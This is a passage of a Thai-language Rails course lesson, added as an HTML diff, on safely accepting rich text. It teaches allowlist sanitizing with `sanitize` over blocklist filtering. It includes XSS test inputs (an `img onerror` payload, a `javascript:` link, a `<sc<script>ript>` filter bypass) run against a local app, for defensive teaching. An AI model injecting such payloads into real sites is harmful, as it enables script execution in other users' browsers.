@@ -1,0 +1,653 @@
+<!doctype html>
+<html lang="th">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>บทเรียน 136 — Rich text — ให้ผู้ใช้จัดตัวหนาได้ โดยไม่เปิดช่องให้รัน JavaScript</title>
+<link rel="stylesheet" href="../../assets/lesson.css">
+<script src="../../assets/quiz.js" defer></script>
+<script src="../../assets/nav.js" defer></script>
+</head>
+<body>
+
+<header>
+  <p class="kicker">บทเรียน 136 · Rails · Day 4 Part 1</p>
+  <h1>Rich text — ให้ผู้ใช้จัดตัวหนาได้ โดยไม่เปิดช่องให้รัน JavaScript</h1>
+  <p class="meta">~25 นาที · ควรผ่าน <a href="../../rails-day-3/lessons/0125-xss-and-n-plus-one-in-views.html">บทเรียน 125</a> (XSS · <code>sanitize</code>) และจบ Day 3 (<a href="../../rails-day-3/lessons/0135-lab-vibe3-hotwire.html">บทเรียน 135</a>) มาก่อน</p>
+  <p class="standfirst">
+    บทความในเว็บของเราตอนนี้เป็น<strong>ตัวหนังสือล้วน</strong> · ถ้าอยากให้คนเขียนทำ<strong>ตัวหนา</strong> ใส่ลิงก์ได้ เราต้องยอมรับ HTML จากผู้ใช้ — ซึ่งเป็นประตูเดียวกับที่คนร้ายใช้ฝังโปรแกรม
+    <br>อ่านจบบทนี้ คุณจะอธิบายได้ว่า<strong>ทำไม "รายการของที่อนุญาต" ปลอดภัยกว่า "รายการของที่ห้าม"</strong> · ใช้ <code>sanitize</code> ใน view ให้เหลือแค่แท็กที่ต้องการ ·
+    รู้ว่าทำไม Rails <strong>ตรวจตอนโชว์ ไม่ใช่ตอนบันทึก</strong> · และรู้ว่าควรเก็บเนื้อหาเป็น HTML หรือ Markdown ก่อนไปติดตั้งของจริงในบท 137
+  </p>
+</header>
+
+<main>
+
+<div class="note">
+  <p><strong>🔁 ทวนก่อนเริ่ม</strong> — คำพวกนี้จะโผล่ในบทนี้</p>
+  <ul>
+    <li><strong>XSS · escape</strong> (<a href="../../rails-day-3/lessons/0125-xss-and-n-plus-one-in-views.html">บท 125</a>) — คนร้ายฝังโปรแกรมไว้ในข้อมูล ให้ไปรันในเบราว์เซอร์คนอื่น · <code>&lt;%= %&gt;</code> กันให้เองด้วยการ<strong>ใส่ซองใส</strong> (แปลง <code>&lt;</code> เป็น <code>&amp;lt;</code>)</li>
+    <li><strong><code>raw</code> · <code>html_safe</code></strong> (บท 125) — สองคำที่<strong>แกะซองออก</strong> ปิดระบบกันภัย · ห้ามใช้กับของที่ผู้ใช้พิมพ์</li>
+    <li><strong><code>sanitize</code></strong> (บท 125) — ทางกลาง: เก็บแท็กที่อยู่ในรายชื่อที่อนุญาต ถอดที่เหลือทิ้ง · ลองใน console ด้วย <code>helper.sanitize(...)</code></li>
+    <li><strong><code>params.expect</code></strong> (<a href="../../rails-day-2/lessons/0117-rest-and-strong-params.html">บท 117</a>) — บอกว่าช่องไหนในฟอร์ม<strong>รับได้</strong> ช่องที่ไม่อยู่ในรายชื่อถูกทิ้ง · จำไว้ เดี๋ยวจะเห็นว่าเป็นหลักการเดียวกัน</li>
+    <li><strong><code>curl</code></strong> (บท 125) — เปิดหน้าเว็บจากเทอร์มินัล เห็น HTML ที่เบราว์เซอร์ได้รับจริง</li>
+  </ul>
+  <p>
+    <strong>🧰 เวอร์ชันที่ใช้ตรวจ:</strong> Ruby 4.0.9 · Rails 8.1.4 · PostgreSQL 18 · Chrome (สั่งด้วยสคริปต์) — สไลด์และ repo ของอาจารย์เขียน Ruby 4.0.5–4.0.6 · Rails 8.1.3 เรื่องในบทนี้ไม่ต่างกัน
+    <br><strong>📍 โค้ดเริ่มจาก:</strong> ตอนจบ Day 3 (<a href="../../rails-day-3/lessons/0135-lab-vibe3-hotwire.html">บท 135</a>) บน branch <code>my-day3</code> ที่ commit แล้ว (<code>git status --short</code> ว่าง) · หมวด 5 · บทความ 30 ชิ้น ·
+    บทนี้<strong>ทดลองแล้วคืนทิ้งตอนจบ</strong>ด้วย <code>git restore</code> — <strong>ยังไม่ติดตั้งอะไรเพิ่ม</strong> ของจริง (Action Text) เริ่มใน<a href="./0137-action-text.html">บท 137</a>
+    <br><strong>🖥 เปิดค้างไว้:</strong> <code>docker compose up -d</code> (ฐานข้อมูล) · <code>bin/dev</code> หนึ่งหน้าต่าง (เว็บที่ <code>localhost:3000</code>) · อีกหน้าต่างไว้พิมพ์คำสั่ง ·
+    ผลรันทุกกล่องมาจากเครื่องจริง · <strong>เวลา ms · วันเวลา · เลข <code>0x…</code> · id ของบทความ ของคุณอาจไม่ตรงกับในบท</strong>
+  </p>
+</div>
+
+<h2 id="sn-sec-1">แผนที่ของ Part 1 — 3 บล็อก และ 3 ประโยคของวัน</h2>
+
+<p>
+  Day 3 เราทำให้แอป<strong>เป็นหน้าเว็บ</strong> (หน้าตา · ขยับได้) · ชุดนี้ทำให้มัน<strong>เป็นของที่เปิดให้คนใช้จริงได้</strong> ·
+  เปิดสไลด์ดูจะเห็นป้าย "DAY 3" และคำว่า "Part 2" — เพราะอาจารย์วางชุดนี้ไว้เป็นครึ่งบ่ายของ Day 3 แล้วย้ายมาเรียนวันนี้ · <strong>ไม่ต้องสนใจป้าย</strong> เว็บนี้เรียกว่า Day 4 Part 1
+</p>
+
+<div class="table-wrap">
+<table>
+  <thead><tr><th>บท</th><th>บล็อก</th><th>ทำอะไร (ภาษาคน · ภาพร้านอาหาร)</th></tr></thead>
+  <tbody>
+    <tr><td>136–141</td><td><strong>D</strong> · Rich text + ไฟล์</td><td>ให้คนเขียนบทความจัดตัวหนาได้ และแนบรูปปกได้ · ไฟล์ไปเก็บ<strong>โกดังรับฝากของนอกร้าน</strong> ไม่ใช่ในครัว</td></tr>
+    <tr><td>142–145</td><td><strong>E</strong> · งานเบื้องหลัง</td><td>ตั้งเวลาเผยแพร่บทความ · งานที่ลูกค้าไม่ต้องยืนรอ ทำเป็น<strong>ใบงานหลังร้าน</strong> (ล้างจาน · ส่งของ) แทน</td></tr>
+    <tr><td>146–148</td><td><strong>F</strong> · Caching</td><td>ทำหน้าแรกให้เร็ว · <strong>จานที่จัดเสร็จวางในตู้อุ่น</strong> ลูกค้าคนต่อไปหยิบได้เลย ไม่ต้องจัดใหม่</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>
+  ลำดับนี้ตั้งใจ (สไลด์หน้า 2): ใส่<strong>เนื้อหาหนัก ๆ</strong> (รูป + rich text) ก่อน หน้าแรกจะได้ช้าจริง ๆ แล้วบล็อก F ค่อยแก้ปัญหาที่เราสร้างเองกับมือ ·
+  จบ Part 1 โฟลเดอร์ <code>prompts/</code> จะมี 7 ไฟล์ (ตอนนี้มี 4: <code>00</code>–<code>03</code>)
+</p>
+
+<p>Day 3 บท 120 ให้จำ 3 ประโยคไว้ก่อน · ตอนนี้ถึงเวลาของข้อ ② ③ แล้ว:</p>
+
+<div class="table-wrap">
+<table>
+  <thead><tr><th>#</th><th>ประโยค</th><th>ภาษาคน</th><th>เจอเต็ม ๆ</th></tr></thead>
+  <tbody>
+    <tr><td>①</td><td>เว็บ interactive ไม่จำเป็นต้องมี state สองชุด</td><td><strong>ทวน</strong> — ครัวถือสมุดสต็อกเล่มเดียว โต๊ะลูกค้าไม่ต้องจดเล่มที่สอง (Turbo ทั้ง Day 3)</td><td>Day 3 จบแล้ว</td></tr>
+    <tr><td>②</td><td>exactly-once ไม่มีอยู่จริง ออกแบบให้ทำซ้ำได้แทน</td><td>ไม่มีใครรับประกันได้ว่างานจะถูกทำ "ครั้งเดียวพอดี" · พนักงานอาจส่งของซ้ำ → ทำงานให้<strong>ทำซ้ำแล้วผลเหมือนเดิม</strong> (เคยเห็นใน seeds บท 120 และ Go <a href="../../day-8/lessons/0036-rest-naming-idempotency.html">บท 36</a>)</td><td>บล็อก E</td></tr>
+    <tr><td>③</td><td>อย่า invalidate cache ให้ key เปลี่ยนแทน</td><td>cache = สำเนาของผลที่ทำเสร็จแล้ว เก็บไว้หยิบซ้ำ · อย่าไล่ทิ้งสำเนาเก่า (invalidate = ประกาศว่าสำเนานี้ใช้ไม่ได้แล้ว) · ติด<strong>เลขรุ่นใหม่</strong> แทน ของเก่าไม่มีใครหยิบเอง (เคยเห็นใน fingerprinting <a href="../../rails-day-3/lessons/0127-asset-pipeline.html">บท 127</a>)</td><td>บล็อก F</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h2 id="sn-sec-2">ของสองอย่างที่ผู้ใช้ใส่เข้ามา — แล้ว rich text คืออะไร</h2>
+
+<p>
+  บล็อก D ว่าด้วย<strong>ของสองอย่างที่ผู้ใช้เป็นคนใส่เข้ามา</strong>: ข้อความที่จัดรูปแบบได้ (บทนี้ + 137) กับไฟล์ (บท 138–140) ·
+  สไลด์หน้า 3 สรุปไว้ประโยคเดียว: <strong>ของที่ผู้ใช้ใส่เข้ามา เชื่อไม่ได้ทั้งคู่</strong>
+</p>
+
+<p>
+  <strong>rich text</strong> คือข้อความที่<strong>มีรูปแบบ</strong> — ตัวหนา ตัวเอียง ลิงก์ หัวข้อ รายการข้อ ๆ ·
+  นึกถึงช่องเขียนอีเมลใน Gmail หรือ Google Docs ที่มีปุ่ม <strong>B</strong> <em>I</em> ด้านบน · กดปุ่ม B แล้วพิมพ์ ข้อความก็หนาทันที
+</p>
+<p>
+  เบื้องหลังปุ่มพวกนั้น<strong>คือ HTML</strong> · กดตัวหนา = editor (ช่องพิมพ์แบบมีปุ่ม) แอบเขียน <code>&lt;strong&gt;อร่อย&lt;/strong&gt;</code> ให้ ·
+  แปลว่าถ้าเว็บเรามี rich text <strong>เราต้องเก็บ HTML ที่มาจากผู้ใช้ แล้วเอาไปโชว์ให้คนอื่นดู</strong>
+</p>
+
+<div class="analogy">
+  <span class="label">🎂 เทียบให้เห็นภาพ — ข้อความบนหน้าเค้กที่ลูกค้าเขียนเอง</span>
+  <p>
+    ร้านเรารับทำเค้กที่<strong>ลูกค้าเขียนข้อความบนหน้าเค้กเอง</strong> · ข้อความธรรมดา (ช่อง title เดิม) เราเขียนให้ตามที่สั่งทุกตัวอักษร ·
+    แต่ลูกค้าอยากได้มากกว่านั้น: "คำว่า<strong>อร่อย</strong>ขอตัวใหญ่สีทอง" — นี่คือ rich text ·
+    ถ้าเรายอมให้ลูกค้า<strong>เอาของตกแต่งมาวางเองได้ทุกอย่าง</strong> วันหนึ่งจะมีคนเอาประทัดมาวาง แล้วเค้กชิ้นนั้นถูกเสิร์ฟให้ทุกโต๊ะ
+  </p>
+  <p>
+    <strong>ที่ไม่เหมือนกัน:</strong> คนกินเค้กยังมองเห็นประทัดแล้วหยิบออกได้ ·
+    เบราว์เซอร์<strong>ไม่ดูเลย มันทำตาม HTML ทุกคำสั่งทันที</strong> และหน้าเว็บหน้าเดียวถูกเปิดโดยคนนับร้อย — ของต้องห้ามหนึ่งชิ้นจึงโดนทุกคนที่เปิดหน้านั้น
+  </p>
+</div>
+
+<p>
+  <strong>เทียบกับ React (บท 125 เล่าไว้):</strong> <code>{post.title}</code> ใน JSX escape ให้เองเหมือน <code>&lt;%= %&gt;</code> ·
+  จะโชว์ HTML ของผู้ใช้ได้ต้องพิมพ์ <code>dangerouslySetInnerHTML</code> — โลก React ก็เจอคำถามเดียวกับบทนี้ทุกเว็บที่มี rich text
+</p>
+
+<div class="jargon">
+  <span class="label">🗣 ศัพท์ที่เพิ่งเรียนไป</span>
+  <dl>
+    <dt>rich text</dt>
+    <dd>ข้อความที่มีรูปแบบ (ตัวหนา ลิงก์ หัวข้อ) · เก็บเป็น HTML หรือ Markdown (หัวข้อท้ายบท) · ตรงข้ามกับ plain text = ตัวหนังสือล้วน ·
+        <strong>ถาม senior ได้ว่า "ช่องไหนในระบบเราที่รับ rich text จากผู้ใช้บ้าง แล้วกรองที่ไหน"</strong></dd>
+    <dt>WYSIWYG editor</dt>
+    <dd>ย่อจาก "What You See Is What You Get" = ช่องพิมพ์ที่เห็นผลทันทีแบบ Google Docs · มันสร้าง HTML ให้เบื้องหลัง ·
+        <strong>พิมพ์บอก AI ได้ว่า "the body field uses a WYSIWYG editor; treat its HTML as untrusted user input"</strong></dd>
+  </dl>
+</div>
+
+<h2 id="sn-sec-3">ลองแบบ escape ทั้งหมด — ผู้ใช้จะเห็นแท็กเป็นตัวหนังสือ</h2>
+
+<p>
+  ทางที่ง่ายที่สุดคือ "ไม่ยอมรับ HTML เลย" — ซึ่งแอปเราทำอยู่แล้วเพราะ <code>&lt;%= %&gt;</code> escape ทุกอย่าง · ลองดูว่าผู้ใช้จะเห็นอะไร ·
+  เปิด <code>bin/rails console</code> แล้วสร้างบทความที่<strong>ชื่อ</strong>มีตัวหนา และ<strong>คำอธิบาย</strong>มีทั้งของดีของร้ายปนกัน:
+</p>
+
+<pre><code>wongnok-blog-all-in-one(dev):001&gt; post = <span class="n">Post</span>.<span class="f">create!</span>(title: <span class="s">"ข้าวซอยร้านนี้ &lt;strong&gt;อร่อย&lt;/strong&gt;"</span>, description: <span class="s">'น้ำแกง&lt;strong&gt;เข้มข้น&lt;/strong&gt; ดูร้านอื่นที่&lt;a href="/posts"&gt;หน้ารวม&lt;/a&gt;&lt;img src="x" onerror="alert(1)"&gt;'</span>, category: <span class="n">Category</span>.<span class="f">first</span>)
+  Category Load (0.5ms)  SELECT "categories".* FROM "categories" ORDER BY "categories"."id" ASC LIMIT 1 /*application='WongnokBlogAllInOne'*/
+  TRANSACTION (0.3ms)  BEGIN /*application='WongnokBlogAllInOne'*/
+  Post Create (0.9ms)  INSERT INTO "posts" ("title", "description", "category_id", "created_at", "updated_at") VALUES ('ข้าวซอยร้านนี้ &lt;strong&gt;อร่อย&lt;/strong&gt;', 'น้ำแกง&lt;strong&gt;เข้มข้น&lt;/strong&gt; ดูร้านอื่นที่&lt;a href="/posts"&gt;หน้ารวม&lt;/a&gt;&lt;img src="x" onerror="alert(1)"&gt;', 1, '2026-11-10 02:47:41.008443', '2026-11-10 02:47:41.008443') RETURNING "id" /*application='WongnokBlogAllInOne'*/
+  TRANSACTION (0.7ms)  COMMIT /*application='WongnokBlogAllInOne'*/
+=&gt;
+#&lt;Post:0x000000012861fbb0
+...
+wongnok-blog-all-in-one(dev):002&gt; post.id
+=&gt; 31</code></pre>
+
+<ul>
+  <li><code>title: "…&lt;strong&gt;อร่อย&lt;/strong&gt;"</code> — ชื่อบทความที่ผู้ใช้อยากให้คำว่า อร่อย เป็นตัวหนา</li>
+  <li><code>description: '…'</code> — ใช้ <code>'</code> (ฟันหนูเดี่ยว) ครอบ เพราะข้างในมี <code>"</code> เยอะ · ข้างในมี 3 อย่าง:
+    <code>&lt;strong&gt;</code> ตัวหนา (ของดี) · <code>&lt;a href="/posts"&gt;</code> ลิงก์ (ของดี) · <code>&lt;img src="x" onerror="alert(1)"&gt;</code> (<strong>ของร้าย</strong>)</li>
+  <li><code>&lt;img src="x" onerror="…"&gt;</code> — รูปที่ที่อยู่ <code>x</code> ไม่มีจริง → โหลดไม่ขึ้น → เบราว์เซอร์รันโค้ดใน <code>onerror</code> ("ถ้ารูปพังให้รันอันนี้") ·
+      <strong>ไม่มีคำว่า script สักตัว แต่รันโปรแกรมได้</strong> · เราใช้แค่ <code>alert(1)</code> (เด้งกล่องข้อความ) ซึ่งไม่ทำอะไรเสียหาย</li>
+  <li>บรรทัด <code>Category Load</code> · <code>TRANSACTION</code> · <code>Post Create</code> — Rails รายงานคำสั่ง SQL ที่ส่งไปฐานข้อมูล (เหมือน Day 2) · <code>/*application=…*/</code> ท้ายบรรทัดคือป้ายชื่อแอปที่ Rails แปะไว้ ไม่ต้องสนใจ</li>
+  <li><code>VALUES ('ข้าวซอยร้านนี้ &lt;strong&gt;…</code> — ฐานข้อมูล<strong>เก็บทุกตัวอักษรตามที่พิมพ์</strong> ไม่มีใครกรอง (เหมือนบท 125)</li>
+  <li><code>=&gt;</code> · <code>#&lt;Post:0x…</code> · <code>...</code> — console โชว์บทความที่เพิ่งสร้าง · เพราะเราเก็บใส่ตัวแปร (<code>post = …</code>) console เลย<strong>ย่อผลไว้แค่หัว</strong>แล้วต่อด้วย <code>...</code> (ค่าเริ่มต้นของ console ไม่ใช่ error) · <code>0x…</code> = ที่อยู่ในหน่วยความจำ ไม่ต้องสนใจ</li>
+  <li><code>post.id</code> → <code>31</code> — <strong>ของคุณอาจเป็นเลขอื่น</strong> ใช้เลขของคุณแทน 31 ทุกที่ข้างล่าง</li>
+</ul>
+
+<div class="warn">
+  <p>⚠️ <strong>ลองได้เฉพาะแอปในเครื่องตัวเองเท่านั้น</strong> — การฝังโค้ดลงเว็บของคนอื่น (แม้แค่ alert) คือการเจาะระบบ ผิดกฎหมาย</p>
+</div>
+
+<p>
+  ดูว่าหน้าบทความส่ง HTML อะไรออกไป · <code>|</code> แปลว่า "ส่งผลของคำสั่งซ้ายไปให้คำสั่งขวา" → เอา HTML ทั้งหน้าไปให้ <code>grep</code> (บท 125) เลือกเฉพาะบรรทัดหัวข้อ (<code>card-title text-3xl</code>) กับบรรทัดคำอธิบาย (<code>leading-relaxed</code>) · <code>\|</code> ตรงกลางแปลว่า "<strong>หรือ</strong>" (เอาบรรทัดที่มีคำแรก หรือคำที่สอง):
+</p>
+
+<pre><code>$ curl -s localhost:3000/posts/31 | grep "card-title text-3xl\|leading-relaxed"
+          &lt;h1 class="card-title text-3xl"&gt;ข้าวซอยร้านนี้ &amp;lt;strong&amp;gt;อร่อย&amp;lt;/strong&amp;gt;&lt;/h1&gt;
+&lt;/turbo-frame&gt;      &lt;p class="leading-relaxed whitespace-pre-line"&gt;น้ำแกง&amp;lt;strong&amp;gt;เข้มข้น&amp;lt;/strong&amp;gt; ดูร้านอื่นที่&amp;lt;a href=&amp;quot;/posts&amp;quot;&amp;gt;หน้ารวม&amp;lt;/a&amp;gt;&amp;lt;img src=&amp;quot;x&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;&lt;/p&gt;</code></pre>
+
+<ul>
+  <li>บรรทัดแรก — <code>&amp;lt;strong&amp;gt;</code> = <code>&lt;strong&gt;</code> ที่ถูก<strong>ใส่ซองใส</strong> · บนจอเห็นคำว่า <code>ข้าวซอยร้านนี้ &lt;strong&gt;อร่อย&lt;/strong&gt;</code> ทั้งแท็ก (ผมเปิดใน Chrome ดูแล้ว · แถบบอกทางด้านบน "บทความทั้งหมด › อาหารไทย › …" ก็เห็นแบบเดียวกัน)</li>
+  <li>บรรทัดสอง — ทุกแท็กถูกใส่ซองหมด รวมถึง <code>&lt;img onerror&gt;</code> · <code>&amp;quot;</code> = รหัสของ <code>"</code> · <strong>ไม่มีอะไรรัน แต่ก็ไม่มีอะไรหนา</strong></li>
+  <li><code>&lt;/turbo-frame&gt;</code> หน้าบรรทัดสอง — เป็นแท็กปิดของกรอบแก้หัวข้อ (บท 131) ที่บังเอิญอยู่บรรทัดเดียวกัน ไม่ต้องสนใจ</li>
+</ul>
+
+<p>
+  ปลอดภัย 100% แต่<strong>ผู้ใช้เห็นแท็กเป็นตัวหนังสือ — นี่ไม่ใช่ rich text แล้ว</strong> ·
+  ส่วนอีกขั้วหนึ่ง ผมลองแก้บรรทัดคำอธิบายใน <code>_post.html.erb</code> เป็น <code>raw post.description</code> แล้วเปิดใน Chrome: ตัวหนาขึ้นจริง ลิงก์ขึ้นจริง และ <strong>alert ของ <code>onerror</code> ทำงาน</strong> (แล้วคืนไฟล์ทันที) ·
+  สไลด์หน้า 4 จึงบอกว่า <strong>คำถามไม่ใช่ "จะกันไหม" แต่เป็น "จะปล่อยอะไรผ่านบ้าง"</strong>
+</p>
+
+<h2 id="sn-sec-4">allowlist กับ blocklist — ผิดแบบไหนเจ็บกว่า</h2>
+
+<p>มีสองวิธีเขียน "กฎว่าอะไรผ่าน":</p>
+<ul>
+  <li><strong>blocklist</strong> (รายการของที่ห้าม) — บอกว่า<strong>อะไรห้ามผ่าน</strong> ที่เหลือผ่านหมด · เช่น "ห้าม <code>&lt;script&gt;</code>"</li>
+  <li><strong>allowlist</strong> (รายการของที่อนุญาต) — บอกว่า<strong>อะไรผ่านได้</strong> ที่เหลือโดนถอดหมด · เช่น "ผ่านได้แค่ <code>strong</code> <code>em</code> <code>a</code> <code>p</code>"</li>
+</ul>
+
+<p>
+  ลอง blocklist แบบที่คนส่วนใหญ่คิดได้ก่อน: "ลบคำว่า <code>&lt;script&gt;</code> ทิ้ง" ·
+  <code>.gsub("&lt;script&gt;", "")</code> คือ method ของข้อความใน Ruby แปลว่า "หาคำนี้ทุกที่ แล้วแทนด้วยข้อความว่าง" (= ลบทิ้ง)
+</p>
+
+<div class="predict">
+<pre><code>wongnok-blog-all-in-one(dev):001&gt; <span class="s">"&lt;script&gt;alert(1)&lt;/script&gt;สวัสดี"</span>.<span class="f">gsub</span>(<span class="s">"&lt;script&gt;"</span>, <span class="s">""</span>)
+wongnok-blog-all-in-one(dev):002&gt; <span class="s">'&lt;img src="x" onerror="alert(1)"&gt;'</span>.<span class="f">gsub</span>(<span class="s">"&lt;script&gt;"</span>, <span class="s">""</span>)
+wongnok-blog-all-in-one(dev):003&gt; <span class="s">"&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/script&gt;"</span>.<span class="f">gsub</span>(<span class="s">"&lt;script&gt;"</span>, <span class="s">""</span>)</code></pre>
+  <p class="ask">ตัวกรองนี้กันได้กี่บรรทัดจาก 3 บรรทัด? บรรทัด 3 ดูแปลก ๆ — ลองไล่ด้วยมือว่าลบ <code>&lt;script&gt;</code> ตรงกลางออกแล้วเหลืออะไร</p>
+  <button class="reveal">เฉลย</button>
+  <div class="answer">
+    <p>ผลจริง:</p>
+<pre><code>wongnok-blog-all-in-one(dev):001&gt; "&lt;script&gt;alert(1)&lt;/script&gt;สวัสดี".gsub("&lt;script&gt;", "")
+=&gt; "alert(1)&lt;/script&gt;สวัสดี"
+wongnok-blog-all-in-one(dev):002&gt; '&lt;img src="x" onerror="alert(1)"&gt;'.gsub("&lt;script&gt;", "")
+=&gt; "&lt;img src=\"x\" onerror=\"alert(1)\"&gt;"
+wongnok-blog-all-in-one(dev):003&gt; "&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/script&gt;".gsub("&lt;script&gt;", "")
+=&gt; "&lt;script&gt;alert(1)&lt;/script&gt;"</code></pre>
+    <ul>
+      <li>บรรทัด 1 — กันได้ (เหลือ <code>&lt;/script&gt;</code> เปล่า ๆ ที่ไม่มีตัวเปิด ไม่ทำอะไร)</li>
+      <li>บรรทัด 2 — <strong>หลุดทั้งก้อน</strong> เพราะไม่มีคำว่า <code>&lt;script&gt;</code> ให้ลบ · คนเขียนตัวกรอง<strong>ลืมนึกถึง onerror</strong> · (<code>\"</code> = วิธีที่ console โชว์ <code>"</code> ในข้อความ)</li>
+      <li>บรรทัด 3 — <strong>ตัวกรองสร้าง <code>&lt;script&gt;</code> ขึ้นมาเอง</strong>: ลบ <code>&lt;script&gt;</code> ตรงกลาง <code>&lt;sc|&lt;script&gt;|ript&gt;</code> ทิ้ง ชิ้นซ้ายขวาเลยมาต่อกันพอดี · ตัวอย่างนี้มาจากเอกสารความปลอดภัยของ Rails เอง</li>
+    </ul>
+    <p><strong>กันได้ 1 ใน 3</strong> · และวิธีหลบแบบอื่นยังมีอีกมาก (<code>onclick</code> · <code>onmouseover</code> · <code>&lt;svg onload&gt;</code> …) — blocklist ต้องรู้ทุกท่าของคนร้าย ซึ่งเป็นไปไม่ได้</p>
+  </div>
+</div>
+
+<p>ทีนี้ส่งของร้ายชิ้นเดียวกันให้ <code>sanitize</code> (ใช้ allowlist) — ผลจริง:</p>
+
+<pre><code>wongnok-blog-all-in-one(dev):004&gt; helper.<span class="f">sanitize</span>(<span class="s">'&lt;img src="x" onerror="alert(1)"&gt;'</span>)
+=&gt; "&lt;img src=\"x\"&gt;"
+wongnok-blog-all-in-one(dev):005&gt; helper.<span class="f">sanitize</span>(<span class="s">'&lt;a href="javascript:alert(1)"&gt;กดเลย&lt;/a&gt;'</span>)
+=&gt; "&lt;a&gt;กดเลย&lt;/a&gt;"</code></pre>
+
+<ul>
+  <li>บรรทัด 004 — <code>img</code> อยู่ในรายการ จึงรอด · <code>src</code> อยู่ในรายการ รอด · <code>onerror</code> <strong>ไม่อยู่ในรายการ ถูกตัด</strong> · sanitize ไม่ต้องรู้จัก onerror เลยก็กันได้</li>
+  <li>บรรทัด 005 — ลิงก์แบบ <code>javascript:</code> (กดแล้วรันโปรแกรมแทนที่จะไปหน้าอื่น) · <code>href</code> ถูกตัดทิ้ง เหลือ <code>&lt;a&gt;</code> ที่กดแล้วไม่ไปไหน · รายการของ sanitize ตรวจลึกถึง<strong>ค่าข้างใน</strong>ด้วย</li>
+</ul>
+
+<p>
+  เทียบความผิดพลาดของสองแบบ (สไลด์หน้า 4) — นี่คือเหตุผลทั้งหมดที่โลกเลือก allowlist:
+</p>
+
+<div class="table-wrap">
+<table>
+  <thead><tr><th></th><th>ลืมใส่อะไรไปหนึ่งอย่าง</th><th>ใครเห็นก่อน</th></tr></thead>
+  <tbody>
+    <tr><td><strong>allowlist</strong></td><td>ลืมใส่ <code>em</code> → ตัวเอียงไม่ขึ้น (feature ขาด)</td><td><strong>เรา</strong> — เห็นตั้งแต่ตอนลองใช้ แก้ได้ก่อนขึ้นจริง</td></tr>
+    <tr><td><strong>blocklist</strong></td><td>ลืมใส่ <code>onerror</code> → โค้ดของคนร้ายรันได้ (ระบบถูกเจาะ)</td><td><strong>คนร้าย</strong> — เราไม่รู้ตัวจนกว่าจะโดน</td></tr>
+  </tbody>
+</table>
+</div>
+
+<div class="analogy">
+  <span class="label">🍰 เทียบให้เห็นภาพ — รายการตัวตกแต่งที่ร้านอนุญาต</span>
+  <p>
+    ร้านเค้กมีสองแบบ · ร้าน A ติดป้าย<strong>รายการของห้ามใส่</strong>: "ห้ามประทัด ห้ามไม้ขีด" — ลูกค้าเอาพลุมา ไม่อยู่ในป้าย พนักงานก็ใส่ให้ ·
+    ร้าน B ถือ<strong>รายการตัวตกแต่งที่ร้านอนุญาต</strong>: "เม็ดน้ำตาล ช็อกโกแลตชิพ ตัวอักษรสีทอง" — ของที่ไม่อยู่ในรายการ<strong>ไม่ใส่ ไม่ว่ามันคืออะไร</strong> ·
+    ร้าน B ไม่ต้องรู้จักพลุก็กันพลุได้ ร้าน A ต้องรู้จักของอันตรายทุกชนิดในโลก
+  </p>
+  <p>
+    <strong>ที่ไม่เหมือนกัน:</strong> ของนอกรายการในร้านจริงถูกปัดทิ้งทั้งชิ้น · <code>sanitize</code> ถอด<strong>แค่แท็ก</strong>แต่<strong>ตัวหนังสือข้างในยังอยู่</strong> (บท 125: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> เหลือ <code>alert(1)</code>) ·
+    และมันตรวจทีละ "ส่วนประกอบ" ด้วย — รับ <code>img</code> แต่แกะ <code>onerror</code> ที่ติดมาออก เหมือนรับช็อกโกแลตแต่แกะไส้ที่ไม่อนุญาตทิ้ง
+  </p>
+</div>
+
+<p>
+  <strong>เทียบของที่รู้แล้ว — หลักการเดียวกันเจอมาแล้วหลายรอบ</strong> (สไลด์หน้า 4):
+  <code>params.expect</code> (บท 117) = บอกว่า<strong>ช่องไหนในฟอร์ม</strong>รับได้ · <code>&lt;%= %&gt;</code> (บท 103/125) = escape ทุกอย่างแล้วค่อยยกเว้นเป็นจุด ·
+  วันนี้ <code>sanitize</code> = บอกว่า<strong>แท็กไหน</strong>ผ่านได้ · บท 140 จะบอกว่า<strong>ไฟล์ชนิดไหน</strong>รับได้ — ทั้งหมดคือ allowlist
+</p>
+
+<div class="jargon">
+  <span class="label">🗣 ศัพท์ที่เพิ่งเรียนไป</span>
+  <dl>
+    <dt>allowlist · blocklist (denylist)</dt>
+    <dd>รายการของที่อนุญาต vs รายการของที่ห้าม · เอกสารเก่าใช้คำว่า whitelist/blacklist · คู่มือความปลอดภัยของ Rails เรียก permitted list / restricted list ·
+        <strong>ถาม senior ได้ว่า "ตรงนี้เรากรองด้วย allowlist หรือ blocklist ถ้าลืมของไปหนึ่งอย่างจะเกิดอะไร"</strong></dd>
+    <dt>event handler attribute (<code>onerror</code> · <code>onclick</code>)</dt>
+    <dd>ช่องในแท็กที่บอกเบราว์เซอร์ว่า "เมื่อเกิดเหตุการณ์นี้ให้รันโค้ดนี้" · เป็นทางที่ XSS ใช้บ่อยเพราะไม่ต้องมีคำว่า script ·
+        <strong>พิมพ์บอก AI ได้ว่า "never filter HTML by removing &lt;script&gt;; use an allowlist sanitizer so on* attributes are dropped too"</strong></dd>
+  </dl>
+</div>
+
+<h2 id="sn-sec-5">ใส่ <code>sanitize</code> ลงใน view แล้วบีบรายการให้แคบ</h2>
+
+<p>
+  ตอนนี้หน้าบทความโชว์คำอธิบายด้วย <code>&lt;%= post.description %&gt;</code> (escape ทั้งหมด) · เปิด <code>app/views/posts/_post.html.erb</code> หาบรรทัดนี้ (อยู่ในก้อน <code>&lt;% if full %&gt;</code> = ตอนโชว์บทความเต็ม):
+</p>
+
+<pre><code>      &lt;p class="leading-relaxed whitespace-pre-line"&gt;&lt;%= post.description %&gt;&lt;/p&gt;</code></pre>
+
+<p>แก้เป็น (เติมคำว่า <code>sanitize</code> คำเดียว · ใน view เรียกตรง ๆ ได้เลย ส่วนใน console ต้องมี <code>helper.</code> นำหน้าแบบเมื่อกี้):</p>
+
+<pre><code>      &lt;p class="leading-relaxed whitespace-pre-line"&gt;&lt;%= <span class="f">sanitize</span> post.description %&gt;&lt;/p&gt;</code></pre>
+
+<div class="predict">
+  <p class="ask">บันทึกไฟล์แล้ว curl ใหม่ · <code>sanitize</code> แบบไม่ตั้งค่าอะไร ใช้รายการเริ่มต้นของ Rails ·
